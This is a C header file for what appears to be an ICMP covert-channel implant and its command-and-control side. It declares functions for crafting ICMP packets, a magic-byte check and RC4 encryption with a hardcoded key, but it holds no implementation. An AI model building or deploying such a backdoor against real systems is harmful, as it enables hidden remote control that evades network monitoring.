#ifndef utils_h
#define utils_h

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <linux/types.h>

#ifndef ICMP_FILTER
#define ICMP_FILTER	1
struct icmp_filter {
	__u32 data;
};
#endif

#define KEY "thisisapassword"
#define KEY_LENGTH 15

#ifndef RAND_ID
#define RAND_ID 6969
#endif

#define BUFFER_SIZE 1472
#define CHECK_ALLOC(x) {if (x == NULL) {fprintf(stderr, "Error: Cannot allocate memory\n"); exit(EXIT_FAILURE);}}


ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size);
void rc4(unsigned char* data, long data_len, unsigned char* key, long key_len, unsigned char* result);
int check_magic_byte(struct icmphdr *icmp);
unsigned short cksum(unsigned short *addr, int len);
struct sockaddr_in prep_ip_headers(struct iphdr *ip);
unsigned char *parse_data_section(unsigned char *packet);
void implant_append_to_data_section(struct icmphdr *icmp, unsigned char *input);
void implant_prep_icmp_headers(struct icmphdr *icmp, size_t size);
void c2_append_to_data_section(struct icmphdr *icmp, unsigned char *input);
void c2_prep_icmp_headers(struct icmphdr *icmp, size_t size);

#endif